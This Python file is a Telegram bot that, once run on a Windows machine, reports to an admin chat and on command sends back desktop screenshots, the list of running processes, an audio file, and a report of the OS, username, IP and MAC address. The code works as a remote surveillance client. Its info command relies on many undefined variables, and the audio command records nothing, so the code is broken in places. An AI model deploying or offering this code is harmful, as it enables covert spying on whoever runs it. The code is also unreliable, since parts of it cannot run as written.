import asyncio
from aiogram import Bot, Dispatcher, types, executor
import os
from config import BOT_TOKEN, admin_chat_id
import pyautogui
from PIL import Image
from subprocess import Popen, PIPE

# todo in the end update requirements

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)


async def main():
    await dp.bot.send_message(admin_chat_id, "✓ System started!", disable_notification=True)


try:
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
except DeprecationWarning:
    pass


@dp.message_handler(commands="check")
async def cmd_check(message: types.Message):
    await message.answer("System status: online")


async def cmd_help(message: types.Message):
    await message.answer(f'\nCommand List:\n/check - Checking System Status\n/info - System characteristics\n/screen - Desktop screenshot\n/audio - Record audio from a voice recorder for a minute\n/process - List of running processes\n/exit - Shutting down the program before reboot\n')


async def cmd_info(message: types.Message):
    file = open("info.txt", "w")
    file.write(
        f"[================================================]\n  Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n  Work speed: {workspeed}\n  Download: {download} MB/s\n  Upload: {uploads} MB/s\n  Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[================================================]\n")
    file.close()
    await message.answer_document(open("info.txt", "rb"))
    file.close()
    os.remove("info.txt")


async def cmd_screen(message: types.Message):
    screen = pyautogui.screenshot("screenshot.jpg")
    await message.answer_photo(open("screenshot.jpg", "rb"))
    os.remove("screenshot.jpg")


async def cmd_audio(message: types.Message):
    await message.answer_audio(open("sound.wav", "rb"))


async def cmd_process(message: types.Message):
    process = [line.decode("cp866", "ignore") for line in Popen("tasklist", stdout=PIPE).stdout.readlines()]
    ride = open("process.txt", "w", encoding="utf-8")
    ride.write(' '.join(process))
    ride.close()
    await message.answer_document(open("process.txt", "rb"))
    ride.close()
    os.remove("process.txt")


async def cmd_exit(message: types.Message):
    await message.answer("Goodbye!")
    raise SystemExit

dp.register_message_handler(cmd_info, commands="info")
dp.register_message_handler(cmd_screen, commands="screen")
dp.register_message_handler(cmd_audio, commands="audio")
dp.register_message_handler(cmd_process, commands="process")
dp.register_message_handler(cmd_help, commands="help")
dp.register_message_handler(cmd_exit, commands="exit")
executor.start_polling(dp, skip_updates=True)
